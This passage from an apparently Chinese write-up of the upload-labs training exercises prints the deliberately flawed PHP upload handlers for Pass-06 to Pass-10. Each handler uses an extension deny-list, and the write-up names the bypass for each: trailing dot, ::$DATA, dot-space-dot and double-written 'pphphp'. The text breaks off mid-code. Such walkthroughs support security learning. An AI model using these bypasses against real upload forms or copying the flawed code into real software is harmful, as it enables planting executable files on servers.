class=\"variable\">$msg</span> = <span class=\"literal\">null</span>;</span><br><span class=\"line\"><span class=\"keyword\">if</span> (<span class=\"keyword\">isset</span>(<span class=\"variable\">$_POST</span>[<span class=\"string\">&#x27;submit&#x27;</span>])) &#123;</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (file_exists(UPLOAD_PATH)) &#123;</span><br><span class=\"line\">        <span class=\"variable\">$deny_ext</span> = <span class=\"keyword\">array</span>(<span class=\"string\">&quot;.php&quot;</span>,<span class=\"string\">&quot;.php5&quot;</span>,<span class=\"string\">&quot;.php4&quot;</span>,<span class=\"string\">&quot;.php3&quot;</span>,<span class=\"string\">&quot;.php2&quot;</span>,<span class=\"string\">&quot;.html&quot;</span>,<span class=\"string\">&quot;.htm&quot;</span>,<span class=\"string\">&quot;.phtml&quot;</span>,<span class=\"string\">&quot;.pht&quot;</span>,<span class=\"string\">&quot;.pHp&quot;</span>,<span class=\"string\">&quot;.pHp5&quot;</span>,<span class=\"string\">&quot;.pHp4&quot;</span>,<span class=\"string\">&quot;.pHp3&quot;</span>,<span class=\"string\">&quot;.pHp2&quot;</span>,<span class=\"string\">&quot;.Html&quot;</span>,<span class=\"string\">&quot;.Htm&quot;</span>,<span class=\"string\">&quot;.pHtml&quot;</span>,<span class=\"string\">&quot;.jsp&quot;</span>,<span class=\"string\">&quot;.jspa&quot;</span>,<span class=\"string\">&quot;.jspx&quot;</span>,<span class=\"string\">&quot;.jsw&quot;</span>,<span class=\"string\">&quot;.jsv&quot;</span>,<span class=\"string\">&quot;.jspf&quot;</span>,<span class=\"string\">&quot;.jtml&quot;</span>,<span class=\"string\">&quot;.jSp&quot;</span>,<span class=\"string\">&quot;.jSpx&quot;</span>,<span class=\"string\">&quot;.jSpa&quot;</span>,<span class=\"string\">&quot;.jSw&quot;</span>,<span class=\"string\">&quot;.jSv&quot;</span>,<span class=\"string\">&quot;.jSpf&quot;</span>,<span class=\"string\">&quot;.jHtml&quot;</span>,<span class=\"string\">&quot;.asp&quot;</span>,<span class=\"string\">&quot;.aspx&quot;</span>,<span class=\"string\">&quot;.asa&quot;</span>,<span class=\"string\">&quot;.asax&quot;</span>,<span class=\"string\">&quot;.ascx&quot;</span>,<span class=\"string\">&quot;.ashx&quot;</span>,<span class=\"string\">&quot;.asmx&quot;</span>,<span class=\"string\">&quot;.cer&quot;</span>,<span class=\"string\">&quot;.aSp&quot;</span>,<span class=\"string\">&quot;.aSpx&quot;</span>,<span class=\"string\">&quot;.aSa&quot;</span>,<span class=\"string\">&quot;.aSax&quot;</span>,<span class=\"string\">&quot;.aScx&quot;</span>,<span class=\"string\">&quot;.aShx&quot;</span>,<span class=\"string\">&quot;.aSmx&quot;</span>,<span class=\"string\">&quot;.cEr&quot;</span>,<span class=\"string\">&quot;.sWf&quot;</span>,<span class=\"string\">&quot;.swf&quot;</span>,<span class=\"string\">&quot;.htaccess&quot;</span>);</span><br><span class=\"line\">        <span class=\"variable\">$file_name</span> = <span class=\"variable\">$_FILES</span>[<span class=\"string\">&#x27;upload_file&#x27;</span>][<span class=\"string\">&#x27;name&#x27;</span>];</span><br><span class=\"line\">        <span class=\"variable\">$file_name</span> = deldot(<span class=\"variable\">$file_name</span>);<span class=\"comment\">//删除文件名末尾的点</span></span><br><span class=\"line\">        <span class=\"variable\">$file_ext</span> = strrchr(<span class=\"variable\">$file_name</span>, <span class=\"string\">&#x27;.&#x27;</span>);</span><br><span class=\"line\">        <span class=\"variable\">$file_ext</span> = strtolower(<span class=\"variable\">$file_ext</span>); <span class=\"comment\">//转换为小写</span></span><br><span class=\"line\">        <span class=\"variable\">$file_ext</span> = str_ireplace(<span class=\"string\">&#x27;::$DATA&#x27;</span>, <span class=\"string\">&#x27;&#x27;</span>, <span class=\"variable\">$file_ext</span>);<span class=\"comment\">//去除字符串::$DATA</span></span><br><span class=\"line\">        </span><br><span class=\"line\">        <span class=\"keyword\">if</span> (!in_array(<span class=\"variable\">$file_ext</span>, <span class=\"variable\">$deny_ext</span>)) &#123;</span><br><span class=\"line\">            <span class=\"variable\">$temp_file</span> = <span class=\"variable\">$_FILES</span>[<span class=\"string\">&#x27;upload_file&#x27;</span>][<span class=\"string\">&#x27;tmp_name&#x27;</span>];</span><br><span class=\"line\">            <span class=\"variable\">$img_path</span> = UPLOAD_PATH.<span class=\"string\">&#x27;/&#x27;</span>.date(<span class=\"string\">&quot;YmdHis&quot;</span>).rand(<span class=\"number\">1000</span>,<span class=\"number\">9999</span>).<span class=\"variable\">$file_ext</span>;</span><br><span class=\"line\">            <span class=\"keyword\">if</span> (move_uploaded_file(<span class=\"variable\">$temp_file</span>,<span class=\"variable\">$img_path</span>)) &#123;</span><br><span class=\"line\">                <span class=\"variable\">$is_upload</span> = <span class=\"literal\">true</span>;</span><br><span class=\"line\">            &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">                <span class=\"variable\">$msg</span> = <span class=\"string\">&#x27;上传出错！&#x27;</span>;</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">        &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">            <span class=\"variable\">$msg</span> = <span class=\"string\">&#x27;此文件不允许上传&#x27;</span>;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">        <span class=\"variable\">$msg</span> = UPLOAD_PATH . <span class=\"string\">&#x27;文件夹不存在,请手工创建！&#x27;</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p><img data-src=\"https://gitee.com/chungod/picture/raw/master/image/image-20210311194014038.png\" alt=\"image-20210311194014038\"></p>\n<p>成功上传</p>\n<p><img data-src=\"https://gitee.com/chungod/picture/raw/master/image/image-20210311194100032.png\" alt=\"image-20210311194100032\"></p>\n<h2 id=\"pass-07点绕过\"><a class=\"markdownIt-Anchor\" href=\"#pass-07点绕过\">#</a> Pass-07（点绕过）</h2>\n<p>题目源码</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"variable\">$is_upload</span> = <span class=\"literal\">false</span>;</span><br><span class=\"line\"><span class=\"variable\">$msg</span> = <span class=\"literal\">null</span>;</span><br><span class=\"line\"><span class=\"keyword\">if</span> (<span class=\"keyword\">isset</span>(<span class=\"variable\">$_POST</span>[<span class=\"string\">&#x27;submit&#x27;</span>])) &#123;</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (file_exists(UPLOAD_PATH)) &#123;</span><br><span class=\"line\">        <span class=\"variable\">$deny_ext</span> = <span class=\"keyword\">array</span>(<span class=\"string\">&quot;.php&quot;</span>,<span class=\"string\">&quot;.php5&quot;</span>,<span class=\"string\">&quot;.php4&quot;</span>,<span class=\"string\">&quot;.php3&quot;</span>,<span class=\"string\">&quot;.php2&quot;</span>,<span class=\"string\">&quot;.html&quot;</span>,<span class=\"string\">&quot;.htm&quot;</span>,<span class=\"string\">&quot;.phtml&quot;</span>,<span class=\"string\">&quot;.pht&quot;</span>,<span class=\"string\">&quot;.pHp&quot;</span>,<span class=\"string\">&quot;.pHp5&quot;</span>,<span class=\"string\">&quot;.pHp4&quot;</span>,<span class=\"string\">&quot;.pHp3&quot;</span>,<span class=\"string\">&quot;.pHp2&quot;</span>,<span class=\"string\">&quot;.Html&quot;</span>,<span class=\"string\">&quot;.Htm&quot;</span>,<span class=\"string\">&quot;.pHtml&quot;</span>,<span class=\"string\">&quot;.jsp&quot;</span>,<span class=\"string\">&quot;.jspa&quot;</span>,<span class=\"string\">&quot;.jspx&quot;</span>,<span class=\"string\">&quot;.jsw&quot;</span>,<span class=\"string\">&quot;.jsv&quot;</span>,<span class=\"string\">&quot;.jspf&quot;</span>,<span class=\"string\">&quot;.jtml&quot;</span>,<span class=\"string\">&quot;.jSp&quot;</span>,<span class=\"string\">&quot;.jSpx&quot;</span>,<span class=\"string\">&quot;.jSpa&quot;</span>,<span class=\"string\">&quot;.jSw&quot;</span>,<span class=\"string\">&quot;.jSv&quot;</span>,<span class=\"string\">&quot;.jSpf&quot;</span>,<span class=\"string\">&quot;.jHtml&quot;</span>,<span class=\"string\">&quot;.asp&quot;</span>,<span class=\"string\">&quot;.aspx&quot;</span>,<span class=\"string\">&quot;.asa&quot;</span>,<span class=\"string\">&quot;.asax&quot;</span>,<span class=\"string\">&quot;.ascx&quot;</span>,<span class=\"string\">&quot;.ashx&quot;</span>,<span class=\"string\">&quot;.asmx&quot;</span>,<span class=\"string\">&quot;.cer&quot;</span>,<span class=\"string\">&quot;.aSp&quot;</span>,<span class=\"string\">&quot;.aSpx&quot;</span>,<span class=\"string\">&quot;.aSa&quot;</span>,<span class=\"string\">&quot;.aSax&quot;</span>,<span class=\"string\">&quot;.aScx&quot;</span>,<span class=\"string\">&quot;.aShx&quot;</span>,<span class=\"string\">&quot;.aSmx&quot;</span>,<span class=\"string\">&quot;.cEr&quot;</span>,<span class=\"string\">&quot;.sWf&quot;</span>,<span class=\"string\">&quot;.swf&quot;</span>,<span class=\"string\">&quot;.htaccess&quot;</span>);</span><br><span class=\"line\">        <span class=\"variable\">$file_name</span> = trim(<span class=\"variable\">$_FILES</span>[<span class=\"string\">&#x27;upload_file&#x27;</span>][<span class=\"string\">&#x27;name&#x27;</span>]);</span><br><span class=\"line\">        <span class=\"variable\">$file_ext</span> = strrchr(<span class=\"variable\">$file_name</span>, <span class=\"string\">&#x27;.&#x27;</span>);</span><br><span class=\"line\">        <span class=\"variable\">$file_ext</span> = strtolower(<span class=\"variable\">$file_ext</span>); <span class=\"comment\">//转换为小写</span></span><br><span class=\"line\">        <span class=\"variable\">$file_ext</span> = str_ireplace(<span class=\"string\">&#x27;::$DATA&#x27;</span>, <span class=\"string\">&#x27;&#x27;</span>, <span class=\"variable\">$file_ext</span>);<span class=\"comment\">//去除字符串::$DATA</span></span><br><span class=\"line\">        <span class=\"variable\">$file_ext</span> = trim(<span class=\"variable\">$file_ext</span>); <span class=\"comment\">//首尾去空</span></span><br><span class=\"line\">        </span><br><span class=\"line\">        <span class=\"keyword\">if</span> (!in_array(<span class=\"variable\">$file_ext</span>, <span class=\"variable\">$deny_ext</span>)) &#123;</span><br><span class=\"line\">            <span class=\"variable\">$temp_file</span> = <span class=\"variable\">$_FILES</span>[<span class=\"string\">&#x27;upload_file&#x27;</span>][<span class=\"string\">&#x27;tmp_name&#x27;</span>];</span><br><span class=\"line\">            <span class=\"variable\">$img_path</span> = UPLOAD_PATH.<span class=\"string\">&#x27;/&#x27;</span>.<span class=\"variable\">$file_name</span>;</span><br><span class=\"line\">            <span class=\"keyword\">if</span> (move_uploaded_file(<span class=\"variable\">$temp_file</span>, <span class=\"variable\">$img_path</span>)) &#123;</span><br><span class=\"line\">                <span class=\"variable\">$is_upload</span> = <span class=\"literal\">true</span>;</span><br><span class=\"line\">            &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">                <span class=\"variable\">$msg</span> = <span class=\"string\">&#x27;上传出错！&#x27;</span>;</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">        &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">            <span class=\"variable\">$msg</span> = <span class=\"string\">&#x27;此文件类型不允许上传！&#x27;</span>;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">        <span class=\"variable\">$msg</span> = UPLOAD_PATH . <span class=\"string\">&#x27;文件夹不存在,请手工创建！&#x27;</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>分析源代码，发现没有删除末尾的点，果断点绕过</p>\n<p><img data-src=\"https://gitee.com/chungod/picture/raw/master/image/image-20210311194252002.png\" alt=\"image-20210311194252002\"></p>\n<p>上传上去后，有个小坑，不能访问 a.php.</p>\n<p><img data-src=\"https://gitee.com/chungod/picture/raw/master/image/image-20210311194821509.png\" alt=\"image-20210311194821509\"></p>\n<p>直接访问 a.php</p>\n<p><img data-src=\"https://gitee.com/chungod/picture/raw/master/image/image-20210311194851252.png\" alt=\"image-20210311194851252\"></p>\n<h2 id=\"pass-08data绕过\"><a class=\"markdownIt-Anchor\" href=\"#pass-08data绕过\">#</a> Pass-08 (::$DATA 绕过)</h2>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"variable\">$is_upload</span> = <span class=\"literal\">false</span>;</span><br><span class=\"line\"><span class=\"variable\">$msg</span> = <span class=\"literal\">null</span>;</span><br><span class=\"line\"><span class=\"keyword\">if</span> (<span class=\"keyword\">isset</span>(<span class=\"variable\">$_POST</span>[<span class=\"string\">&#x27;submit&#x27;</span>])) &#123;</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (file_exists(UPLOAD_PATH)) &#123;</span><br><span class=\"line\">        <span class=\"variable\">$deny_ext</span> = <span class=\"keyword\">array</span>(<span class=\"string\">&quot;.php&quot;</span>,<span class=\"string\">&quot;.php5&quot;</span>,<span class=\"string\">&quot;.php4&quot;</span>,<span class=\"string\">&quot;.php3&quot;</span>,<span class=\"string\">&quot;.php2&quot;</span>,<span class=\"string\">&quot;.html&quot;</span>,<span class=\"string\">&quot;.htm&quot;</span>,<span class=\"string\">&quot;.phtml&quot;</span>,<span class=\"string\">&quot;.pht&quot;</span>,<span class=\"string\">&quot;.pHp&quot;</span>,<span class=\"string\">&quot;.pHp5&quot;</span>,<span class=\"string\">&quot;.pHp4&quot;</span>,<span class=\"string\">&quot;.pHp3&quot;</span>,<span class=\"string\">&quot;.pHp2&quot;</span>,<span class=\"string\">&quot;.Html&quot;</span>,<span class=\"string\">&quot;.Htm&quot;</span>,<span class=\"string\">&quot;.pHtml&quot;</span>,<span class=\"string\">&quot;.jsp&quot;</span>,<span class=\"string\">&quot;.jspa&quot;</span>,<span class=\"string\">&quot;.jspx&quot;</span>,<span class=\"string\">&quot;.jsw&quot;</span>,<span class=\"string\">&quot;.jsv&quot;</span>,<span class=\"string\">&quot;.jspf&quot;</span>,<span class=\"string\">&quot;.jtml&quot;</span>,<span class=\"string\">&quot;.jSp&quot;</span>,<span class=\"string\">&quot;.jSpx&quot;</span>,<span class=\"string\">&quot;.jSpa&quot;</span>,<span class=\"string\">&quot;.jSw&quot;</span>,<span class=\"string\">&quot;.jSv&quot;</span>,<span class=\"string\">&quot;.jSpf&quot;</span>,<span class=\"string\">&quot;.jHtml&quot;</span>,<span class=\"string\">&quot;.asp&quot;</span>,<span class=\"string\">&quot;.aspx&quot;</span>,<span class=\"string\">&quot;.asa&quot;</span>,<span class=\"string\">&quot;.asax&quot;</span>,<span class=\"string\">&quot;.ascx&quot;</span>,<span class=\"string\">&quot;.ashx&quot;</span>,<span class=\"string\">&quot;.asmx&quot;</span>,<span class=\"string\">&quot;.cer&quot;</span>,<span class=\"string\">&quot;.aSp&quot;</span>,<span class=\"string\">&quot;.aSpx&quot;</span>,<span class=\"string\">&quot;.aSa&quot;</span>,<span class=\"string\">&quot;.aSax&quot;</span>,<span class=\"string\">&quot;.aScx&quot;</span>,<span class=\"string\">&quot;.aShx&quot;</span>,<span class=\"string\">&quot;.aSmx&quot;</span>,<span class=\"string\">&quot;.cEr&quot;</span>,<span class=\"string\">&quot;.sWf&quot;</span>,<span class=\"string\">&quot;.swf&quot;</span>,<span class=\"string\">&quot;.htaccess&quot;</span>);</span><br><span class=\"line\">        <span class=\"variable\">$file_name</span> = trim(<span class=\"variable\">$_FILES</span>[<span class=\"string\">&#x27;upload_file&#x27;</span>][<span class=\"string\">&#x27;name&#x27;</span>]);</span><br><span class=\"line\">        <span class=\"variable\">$file_name</span> = deldot(<span class=\"variable\">$file_name</span>);<span class=\"comment\">//删除文件名末尾的点</span></span><br><span class=\"line\">        <span class=\"variable\">$file_ext</span> = strrchr(<span class=\"variable\">$file_name</span>, <span class=\"string\">&#x27;.&#x27;</span>);</span><br><span class=\"line\">        <span class=\"variable\">$file_ext</span> = strtolower(<span class=\"variable\">$file_ext</span>); <span class=\"comment\">//转换为小写</span></span><br><span class=\"line\">        <span class=\"variable\">$file_ext</span> = trim(<span class=\"variable\">$file_ext</span>); <span class=\"comment\">//首尾去空</span></span><br><span class=\"line\">        </span><br><span class=\"line\">        <span class=\"keyword\">if</span> (!in_array(<span class=\"variable\">$file_ext</span>, <span class=\"variable\">$deny_ext</span>)) &#123;</span><br><span class=\"line\">            <span class=\"variable\">$temp_file</span> = <span class=\"variable\">$_FILES</span>[<span class=\"string\">&#x27;upload_file&#x27;</span>][<span class=\"string\">&#x27;tmp_name&#x27;</span>];</span><br><span class=\"line\">            <span class=\"variable\">$img_path</span> = UPLOAD_PATH.<span class=\"string\">&#x27;/&#x27;</span>.date(<span class=\"string\">&quot;YmdHis&quot;</span>).rand(<span class=\"number\">1000</span>,<span class=\"number\">9999</span>).<span class=\"variable\">$file_ext</span>;</span><br><span class=\"line\">            <span class=\"keyword\">if</span> (move_uploaded_file(<span class=\"variable\">$temp_file</span>, <span class=\"variable\">$img_path</span>)) &#123;</span><br><span class=\"line\">                <span class=\"variable\">$is_upload</span> = <span class=\"literal\">true</span>;</span><br><span class=\"line\">            &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">                <span class=\"variable\">$msg</span> = <span class=\"string\">&#x27;上传出错！&#x27;</span>;</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">        &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">            <span class=\"variable\">$msg</span> = <span class=\"string\">&#x27;此文件类型不允许上传！&#x27;</span>;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">        <span class=\"variable\">$msg</span> = UPLOAD_PATH . <span class=\"string\">&#x27;文件夹不存在,请手工创建！&#x27;</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p><img data-src=\"https://gitee.com/chungod/picture/raw/master/image/image-20210311195351923.png\" alt=\"image-20210311195351923\"></p>\n<p>需要删除::$DATA, 直接访问</p>\n<p><img data-src=\"https://gitee.com/chungod/picture/raw/master/image/image-20210311195627082.png\" alt=\"image-20210311195627082\"></p>\n<h2 id=\"pass-09点空点绕过\"><a class=\"markdownIt-Anchor\" href=\"#pass-09点空点绕过\">#</a> Pass-09（点空点绕过）</h2>\n<p>题目源码</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"variable\">$is_upload</span> = <span class=\"literal\">false</span>;</span><br><span class=\"line\"><span class=\"variable\">$msg</span> = <span class=\"literal\">null</span>;</span><br><span class=\"line\"><span class=\"keyword\">if</span> (<span class=\"keyword\">isset</span>(<span class=\"variable\">$_POST</span>[<span class=\"string\">&#x27;submit&#x27;</span>])) &#123;</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (file_exists(UPLOAD_PATH)) &#123;</span><br><span class=\"line\">        <span class=\"variable\">$deny_ext</span> = <span class=\"keyword\">array</span>(<span class=\"string\">&quot;.php&quot;</span>,<span class=\"string\">&quot;.php5&quot;</span>,<span class=\"string\">&quot;.php4&quot;</span>,<span class=\"string\">&quot;.php3&quot;</span>,<span class=\"string\">&quot;.php2&quot;</span>,<span class=\"string\">&quot;.html&quot;</span>,<span class=\"string\">&quot;.htm&quot;</span>,<span class=\"string\">&quot;.phtml&quot;</span>,<span class=\"string\">&quot;.pht&quot;</span>,<span class=\"string\">&quot;.pHp&quot;</span>,<span class=\"string\">&quot;.pHp5&quot;</span>,<span class=\"string\">&quot;.pHp4&quot;</span>,<span class=\"string\">&quot;.pHp3&quot;</span>,<span class=\"string\">&quot;.pHp2&quot;</span>,<span class=\"string\">&quot;.Html&quot;</span>,<span class=\"string\">&quot;.Htm&quot;</span>,<span class=\"string\">&quot;.pHtml&quot;</span>,<span class=\"string\">&quot;.jsp&quot;</span>,<span class=\"string\">&quot;.jspa&quot;</span>,<span class=\"string\">&quot;.jspx&quot;</span>,<span class=\"string\">&quot;.jsw&quot;</span>,<span class=\"string\">&quot;.jsv&quot;</span>,<span class=\"string\">&quot;.jspf&quot;</span>,<span class=\"string\">&quot;.jtml&quot;</span>,<span class=\"string\">&quot;.jSp&quot;</span>,<span class=\"string\">&quot;.jSpx&quot;</span>,<span class=\"string\">&quot;.jSpa&quot;</span>,<span class=\"string\">&quot;.jSw&quot;</span>,<span class=\"string\">&quot;.jSv&quot;</span>,<span class=\"string\">&quot;.jSpf&quot;</span>,<span class=\"string\">&quot;.jHtml&quot;</span>,<span class=\"string\">&quot;.asp&quot;</span>,<span class=\"string\">&quot;.aspx&quot;</span>,<span class=\"string\">&quot;.asa&quot;</span>,<span class=\"string\">&quot;.asax&quot;</span>,<span class=\"string\">&quot;.ascx&quot;</span>,<span class=\"string\">&quot;.ashx&quot;</span>,<span class=\"string\">&quot;.asmx&quot;</span>,<span class=\"string\">&quot;.cer&quot;</span>,<span class=\"string\">&quot;.aSp&quot;</span>,<span class=\"string\">&quot;.aSpx&quot;</span>,<span class=\"string\">&quot;.aSa&quot;</span>,<span class=\"string\">&quot;.aSax&quot;</span>,<span class=\"string\">&quot;.aScx&quot;</span>,<span class=\"string\">&quot;.aShx&quot;</span>,<span class=\"string\">&quot;.aSmx&quot;</span>,<span class=\"string\">&quot;.cEr&quot;</span>,<span class=\"string\">&quot;.sWf&quot;</span>,<span class=\"string\">&quot;.swf&quot;</span>,<span class=\"string\">&quot;.htaccess&quot;</span>);</span><br><span class=\"line\">        <span class=\"variable\">$file_name</span> = trim(<span class=\"variable\">$_FILES</span>[<span class=\"string\">&#x27;upload_file&#x27;</span>][<span class=\"string\">&#x27;name&#x27;</span>]);</span><br><span class=\"line\">        <span class=\"variable\">$file_name</span> = deldot(<span class=\"variable\">$file_name</span>);<span class=\"comment\">//删除文件名末尾的点</span></span><br><span class=\"line\">        <span class=\"variable\">$file_ext</span> = strrchr(<span class=\"variable\">$file_name</span>, <span class=\"string\">&#x27;.&#x27;</span>);</span><br><span class=\"line\">        <span class=\"variable\">$file_ext</span> = strtolower(<span class=\"variable\">$file_ext</span>); <span class=\"comment\">//转换为小写</span></span><br><span class=\"line\">        <span class=\"variable\">$file_ext</span> = str_ireplace(<span class=\"string\">&#x27;::$DATA&#x27;</span>, <span class=\"string\">&#x27;&#x27;</span>, <span class=\"variable\">$file_ext</span>);<span class=\"comment\">//去除字符串::$DATA</span></span><br><span class=\"line\">        <span class=\"variable\">$file_ext</span> = trim(<span class=\"variable\">$file_ext</span>); <span class=\"comment\">//首尾去空</span></span><br><span class=\"line\">        </span><br><span class=\"line\">        <span class=\"keyword\">if</span> (!in_array(<span class=\"variable\">$file_ext</span>, <span class=\"variable\">$deny_ext</span>)) &#123;</span><br><span class=\"line\">            <span class=\"variable\">$temp_file</span> = <span class=\"variable\">$_FILES</span>[<span class=\"string\">&#x27;upload_file&#x27;</span>][<span class=\"string\">&#x27;tmp_name&#x27;</span>];</span><br><span class=\"line\">            <span class=\"variable\">$img_path</span> = UPLOAD_PATH.<span class=\"string\">&#x27;/&#x27;</span>.<span class=\"variable\">$file_name</span>;</span><br><span class=\"line\">            <span class=\"keyword\">if</span> (move_uploaded_file(<span class=\"variable\">$temp_file</span>, <span class=\"variable\">$img_path</span>)) &#123;</span><br><span class=\"line\">                <span class=\"variable\">$is_upload</span> = <span class=\"literal\">true</span>;</span><br><span class=\"line\">            &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">                <span class=\"variable\">$msg</span> = <span class=\"string\">&#x27;上传出错！&#x27;</span>;</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">        &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">            <span class=\"variable\">$msg</span> = <span class=\"string\">&#x27;此文件类型不允许上传！&#x27;</span>;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">        <span class=\"variable\">$msg</span> = UPLOAD_PATH . <span class=\"string\">&#x27;文件夹不存在,请手工创建！&#x27;</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>利用点空点绕过</p>\n<p><img data-src=\"https://gitee.com/chungod/picture/raw/master/image/image-20210311200110217.png\" alt=\"image-20210311200110217\"></p>\n<p>成功访问 a.php</p>\n<p><img data-src=\"https://gitee.com/chungod/picture/raw/master/image/image-20210311200148728.png\" alt=\"image-20210311200148728\"></p>\n<h2 id=\"pass-10双写pphphp绕过\"><a class=\"markdownIt-Anchor\" href=\"#pass-10双写pphphp绕过\">#</a> Pass-10 (双写 pphphp 绕过)</h2>\n<p>题目源码</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"variable\">$is_upload</span> = <span class=\"literal\">false</span>;</span><br><span class=\"line\"><span class=\"variable\">$msg</span> = <span class=\"literal\">null</span>;</span><br><span class=\"line\"><span class=\"keyword\">if</span> (<span class=\"keyword\">isset</span>(<span class=\"variable\">$_POST</span>[<span class=\"string\">&#x27;submit&#x27;</span>])) &#123;</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (file_exists(UPLOAD_PATH)) &#123;</span><br><span class=\"line\">        <span class=\"variable\">$deny_ext</span> = <span class=\"keyword\">array</span>(<span class=\"string\">&quot;php&quot;</span>,<span class=\"string\">&quot;php5&quot;</span>,<span class=\"string\">&quot;php4&quot;</span>,<span class=\"string\">&quot;php3&quot;</span>,<span class=\"string\">&quot;php2&quot;</span>,<span class=\"string\">&quot;html&quot;</span>,<span class=\"string\">&quot;htm&quot;</span>,<span class=\"string\">&quot;phtml&quot;</span>,<span class=\"string\">&quot;pht&quot;</span>,<span class=\"string\">&quot;jsp&quot;</span>,<span class=\"string\">&quot;jspa&quot;</span>,<span class=\"string\">&quot;jspx&quot;</span>,<span class=\"string\">&quot;jsw&quot;</span>,<span class=\"string\">&quot;jsv&quot;</span>,<span class=\"string\">&quot;jspf&quot;</span>,<span class=\"string\">&quot;jtml&quot;</span>,<span class=\"string\">&quot;asp&quot;</span>,<span class=\"string\">&quot;aspx&quot;</span>,<span class=\"string\">&quot;asa&quot;</span>,<span class=\"string\">&quot;asax&quot;</span>,<span class=\"string\">&quot;ascx&quot;</span>,<span class=\"string\">&quot;ashx&quot;</span>,<span class=\"string\">&quot;asmx&quot;</span>,<span class=\"string\">&quot;cer&quot;</span>,<span class=\"string\">&quot;swf&quot;</span>,<span class=\"string\">&quot;htaccess&quot;</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"variable\">$file_name</span> = trim(<span class=\"variable\">$_FILES</span>[<span class=\"string\">&#x27;upload_file&#x27;</span>][<span 